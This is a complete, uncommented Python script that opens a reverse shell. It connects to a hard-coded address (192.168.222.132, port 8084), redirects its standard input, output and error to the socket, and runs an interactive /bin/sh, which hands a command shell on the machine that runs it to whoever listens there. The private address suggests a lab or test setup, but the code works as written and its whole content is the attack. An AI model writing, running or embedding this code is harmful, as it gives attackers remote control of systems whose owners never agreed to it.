import socket
import subprocess
import os
 
def run():
    ip = "192.168.222.132"
    port = 8084
 
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
 
    for f in (0, 1, 2):
        os.set_inheritable(f, True)
 
    subprocess.run(["/bin/sh", "-i"], check=True)
 
if __name__ == "__main__":
    run()
